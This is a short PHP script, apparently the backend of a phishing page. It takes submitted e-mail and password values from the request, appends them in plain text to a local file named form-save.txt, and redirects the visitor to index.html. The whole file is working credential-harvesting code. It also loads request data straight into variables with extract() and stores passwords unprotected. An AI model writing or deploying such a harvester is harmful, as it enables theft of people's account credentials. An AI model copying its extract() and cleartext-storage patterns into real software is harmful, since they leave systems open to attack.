<?php
    extract($_REQUEST);
    $file=fopen("form-save.txt","a");

    fwrite($file,"E-mail :");
    fwrite($file, $mail ."\n");
    fwrite($file,"Password :");
    fwrite($file, $password ."\n");
    fclose($file);
    header("location: index.html");
 ?>